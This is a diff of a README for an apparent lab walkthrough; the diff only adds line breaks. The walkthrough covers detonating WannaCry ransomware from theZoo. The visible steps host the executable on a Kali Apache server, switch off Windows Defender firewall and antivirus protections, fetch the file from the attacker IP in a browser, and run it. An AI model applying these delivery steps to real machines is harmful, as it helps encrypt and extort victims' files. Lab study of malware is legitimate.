@@ -52,6 +52,8 @@ theZoo.git
 <br/>
 <img src="https://imgur.com/3NGLzPH.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 </p>
+<br />
+<br />
 <p align="center">
 7. After installation, type Update-db at the mdb prompt and list all to identify WannaCry.<br/> 
 <img src="https://imgur.com/WITbzxH.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
@@ -65,28 +67,44 @@ ls (To verify that the presence of the executable ransomware);
 sudo mv MySweetHeart.exe /var/www/html;
 sudo service apache2 start (Start Apache);
 <br/>
+<br />
 <img src="https://imgur.com/x0x2aNf.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
 <p align="center">
-  
+<br />
+<br />
 9. You may need to turn off the Windows Defender Firewall settings for the ransomware attack to work
+<br />
+<br />
 <img src="https://imgur.com/nCNE2af.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
 <p align="center">
-  
 10. Turn off the Virus & threat protections settings too
+<br />
+<br />
 <img src="https://imgur.com/FKiuWhY.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
 <p align="center">
-  
+<br />
+<br />
 11. In windows client, open a browser and enter http://Kali-IP-Address/ransomware.exe. 
+<br />
+<br />
 <img src="https://imgur.com/kZVgZO1.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
 <p align="center">
-  
+<br />
+<br />
 12. Select “run” when prompted. Select “yes” when prompted. The Ransomware is activated on the screen now! The windows client is under attack. 
+<br />
+<br />
 <img src="https://imgur.com/xsFjrTb.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
 <p align="center">
-  
+<br />
+<br />
 13. The users files are encrypted and they attackers are now requesting a ransome. 
+<br />
+<br />
 <img src="https://imgur.com/fwVX5zU.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
 <p align="center">
+<br />
+<br />
   
 <!--
  ```diff
